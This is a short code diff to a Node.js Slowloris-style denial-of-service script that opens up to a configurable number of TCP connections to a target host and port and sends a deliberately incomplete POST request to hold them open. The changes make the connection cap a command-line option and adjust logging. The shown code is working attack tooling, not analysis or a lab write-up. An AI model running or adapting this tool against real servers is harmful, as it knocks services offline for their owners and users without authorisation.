@@ -6,13 +6,13 @@ const argv = require('minimist')(process.argv.slice(2));
 const validIp = require('./util/validations').validIp
 const validPort = require('./util/validations').validPort
 
-const maxConnections = 500;
 const connections = [];
 
 const url = argv.url || argv.u;
 const host = argv.host || argv.h || dnsSync.resolve(url);
 const port = argv.port || argv.p || 80;
 const timeout = argv.timeout || argv.t || 500;
+const maxConnections = argv.maxConnections || 500;
 
 class Connection {
   constructor(h, p) {
@@ -23,7 +23,7 @@ class Connection {
     this.t = Date.now();
 
     this.client = net.connect({ port: p, host: h }, () => {
-      //process.stdout.write("Connected, Sending... ");
+      //console.log("Connected, Sending... ");
 
       this.client.write(
         "POST / HTTP/1.1\r\nHost: " +
@@ -33,10 +33,10 @@ class Connection {
         "Content-Length: 385\r\n\r\nvx=321&d1=fire&l"
       );
 
-      //process.stdout.write("Written.\n");
+      //console.log("Written.\n");
     });
     this.client.on("data", data => {
-      console.log("\t-Received " + data.length + " bytes...");
+      //console.log("\t-Received " + data.length + " bytes...");
       this.client.end();
     });
     this.client.on("end", () => {
@@ -75,9 +75,7 @@ const slowLoris = () => setInterval(() => {
   });
 
   if (notify) {
-    process.stdout.clearLine();
-    process.stdout.cursorTo(0);
-    process.stdout.write(
+    console.log(
       "Active connections: " + connections.length + " / " + maxConnections
     );
   }
